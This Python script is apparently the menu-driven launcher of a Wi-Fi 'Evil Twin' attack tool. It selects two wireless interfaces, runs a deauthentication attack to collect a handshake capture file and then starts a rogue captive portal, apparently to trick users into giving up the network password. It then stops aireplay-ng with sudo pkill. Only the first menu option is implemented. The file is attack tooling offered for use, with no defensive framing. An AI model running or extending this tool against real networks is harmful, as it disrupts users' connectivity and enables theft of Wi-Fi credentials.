from deauth import list_interface,stop_monitor_mode
from collectCap import collectCapFile,startDeauth
import hotsportSetup
import threading
import subprocess

def printETA():
    print("""\n
  _____       _ _   _            _       
 | ____|_   _(_) | | |___      _(_)_ __  
 |  _| \ \ / / | | | __\ \ /\ / / | '_ \ 
 | |___ \ V /| | | | |_ \ V  V /| | | | |
 |_____| \_/ |_|_|  \__| \_/\_/ |_|_| |_|

                                         """)

def startETA(deauth,captivwifiePortal):
    cap = collectCapFile(deauth)
    printETA()
    if cap:
        print("Cap collected successfully")
        hotsportSetup.startCaptivePortal(captivwifiePortal,cap)
        stopDeoth = ["sudo","pkill","aireplay-ng"]
        subprocess.run(stopDeoth,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        stop_monitor_mode(deauth)


printETA()

print("""
      1 : To performe total Evil Twin Attack
      2 : Create Captive portal
      3 : Collect cap file
      4 : Deauth Attack
      """)
choice = input("Select an option : ")

if choice == "1":
    wifiInterfaces = list_interface()
    if len(wifiInterfaces) < 2:
        print("Minimum 2 wifi interfaces needed")
    else:
        index = 1
        for interface in wifiInterfaces:
            print(f"{index} : {interface}")
            index += 1

        deauth = input("Select a interface for deauth : ")
        captivePortal = input("Select a interface for captive Portal : ")

        if deauth and captivePortal and deauth != captivePortal:
            try:
                deauth = wifiInterfaces[int(deauth)-1]
                captivePortal = wifiInterfaces[int(captivePortal)-1]
            except:
                print("Select a valid option")
                exit(0)
            startETA(deauth,captivePortal)
        else:
            print("Select a valid option")


